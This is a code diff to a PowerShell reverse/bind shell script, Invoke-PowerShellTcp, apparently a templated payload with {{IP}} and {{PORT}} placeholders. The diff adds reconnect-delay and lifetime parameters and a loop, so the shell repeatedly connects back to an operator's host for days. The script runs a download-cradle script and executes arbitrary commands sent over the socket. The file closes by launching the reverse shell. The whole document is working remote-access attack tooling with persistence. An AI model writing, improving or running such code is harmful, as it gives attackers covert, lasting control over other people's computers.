@@ -9,22 +9,23 @@ function Invoke-PowerShellTcp
 
         [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
         [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
-        [String]
-        $IPAddress,
+        [String] $IPAddress,
 
         [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
         [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
-        [Int]
-        $Port,
+        [Int] $Port,
 
         [Parameter(ParameterSetName="reverse")]
-        [Switch]
-        $Reverse,
+        [Switch] $Reverse,
 
         [Parameter(ParameterSetName="bind")]
-        [Switch]
-        $Bind
+        [Switch] $Bind,
 
+        [Parameter(ParameterSetName="reverse", Mandatory = $false)]
+        [Int] $Delay=10,
+
+        [Parameter(ParameterSetName="reverse", Mandatory = $false)]
+        [Int] $LifeTime=3
     )
     function Read-ShellPacket {
         param (
@@ -108,70 +109,83 @@ function Invoke-PowerShellTcp
         $result | ? { $_.data }
     }
 
-    #Connect back if the reverse switch is used.
-    if ($Reverse)
-    {
-        $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
-        if (-not $client) { Return }
-    }
+    function Handle-Packets {
+        #Create PowerShell object
+        $PowerShell = [powershell]::Create()
+        [void]$PowerShell.AddScript($DL_CRADLE)
 
-    #Bind to the provided port if Bind switch is used.
-    if ($Bind)
-    {
-        $listener = [System.Net.Sockets.TcpListener]$Port
-        $listener.start()
-        $client = $listener.AcceptTcpClient()
-    }
+        Write-ShellPacket (Get-ShellHello) $stream
 
-    $error.clear()
-    $stream = $client.GetStream()
-    # this the shell hello
-    $stream.Write([byte[]](0x21,0x9e,0x10,0x55,0x75,0x6a,0x1a,0x6b),0,8)
-    [byte[]]$bytes = 0..1024|%{0}
+        $init = ( $PowerShell.Invoke() | Out-String )
 
-    #Create PowerShell object
-    $PowerShell = [powershell]::Create()
-    [void]$PowerShell.AddScript($DL_CRADLE)
-
-    Write-ShellPacket (Get-ShellHello) $stream
-
-    $init = ( $PowerShell.Invoke() | Out-String )
-
-    Get-OutputStreams $PowerShell.Streams | % { Write-ShellPacket $_ $stream }
-
-    Write-ShellPacket (Get-ShellPrompt) $stream
-
-    $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
-    $data = ""
-    while ( $packet = (Read-ShellPacket  $stream) ) {
-        $output = ""
-        if ($packet.msg_type -eq "COMMAND") {
-            $data = $packet.data
-
-            #Execute the command on the target.
-            $PowerShell.Commands.Clear()
-            [void]$PowerShell.AddScript($data)
-            $output = ( $PowerShell.Invoke() | Out-String -Width $packet.width)
-
-            Write-ShellPacket @{ "msg_type" = "OUTPUT"; "data" = "$output" } $stream
-            Get-OutputStreams $PowerShell.Streams $packet.width | % {
-                Write-ShellPacket $_ $stream
-            }
-        } elseif ($packet.msg_type -eq "TABCOMPL") {
-            $data = $packet.data
-            $x = ([System.Management.Automation.CommandCompletion]::CompleteInput($data, $data.length, $Null, $PowerShell))
-            $output = $x.CompletionMatches.CompletionText
-            if (-not $output) { $output = "" }
-            if ($output.gettype() -eq [System.String]) { $output = @($output) }
-
-            Write-ShellPacket @{ "msg_type" = "TABCOMPL"; "data" = $output } $stream
-        }
+        Get-OutputStreams $PowerShell.Streams | % { Write-ShellPacket $_ $stream }
 
         Write-ShellPacket (Get-ShellPrompt) $stream
+
+        $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
+        $data = ""
+        while ( $packet = (Read-ShellPacket  $stream) ) {
+            $output = ""
+            if ($packet.msg_type -eq "COMMAND") {
+                $data = $packet.data
+
+                #Execute the command on the target.
+                $PowerShell.Commands.Clear()
+                [void]$PowerShell.AddScript($data)
+                $output = ( $PowerShell.Invoke() | Out-String -Width $packet.width)
+
+                Write-ShellPacket @{ "msg_type" = "OUTPUT"; "data" = "$output" } $stream
+                Get-OutputStreams $PowerShell.Streams $packet.width | % {
+                    Write-ShellPacket $_ $stream
+                }
+            } elseif ($packet.msg_type -eq "TABCOMPL") {
+                $data = $packet.data
+                $x = ([System.Management.Automation.CommandCompletion]::CompleteInput($data, $data.length, $Null, $PowerShell))
+                $output = $x.CompletionMatches.CompletionText
+                if (-not $output) { $output = "" }
+                if ($output.gettype() -eq [System.String]) { $output = @($output) }
+
+                Write-ShellPacket @{ "msg_type" = "TABCOMPL"; "data" = $output } $stream
+            }
+
+            Write-ShellPacket (Get-ShellPrompt) $stream
+        }
     }
-    if ($client) { $client.Close() }
-    if ($listener) {$listener.Stop()}
+
+    $start_time = Get-Date
+    $now = Get-Date
+    while ( ($now - $start_time).TotalDays -lt $LifeTime ) {
+        #Connect back if the reverse switch is used.
+        if ($Reverse)
+        {
+            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
+            if (-not $client) { Return }
+        }
+
+        #Bind to the provided port if Bind switch is used.
+        if ($Bind)
+        {
+            $listener = [System.Net.Sockets.TcpListener]$Port
+            $listener.start()
+            $client = $listener.AcceptTcpClient()
+        }
+
+        $error.clear()
+        $stream = $client.GetStream()
+        # this the shell hello
+        $stream.Write([byte[]](0x21,0x9e,0x10,0x55,0x75,0x6a,0x1a,0x6b),0,8)
+        [byte[]]$bytes = 0..1024|%{0}
+
+        Handle-Packets
+
+        if ($client) { $client.Close() }
+        if ($listener) {$listener.Stop()}
+
+        Sleep $Delay
+        $now = Get-Date
+    }
 }
 
 
-Invoke-PowerShellTcp {{IP}} {{PORT}} -Reverse
+# Start-Job -ScriptBlock { Invoke-PowerShellTcp {{IP}} {{PORT}} -Reverse }
+Invoke-PowerShellTcp {{IP}} {{PORT}} -Reverse 
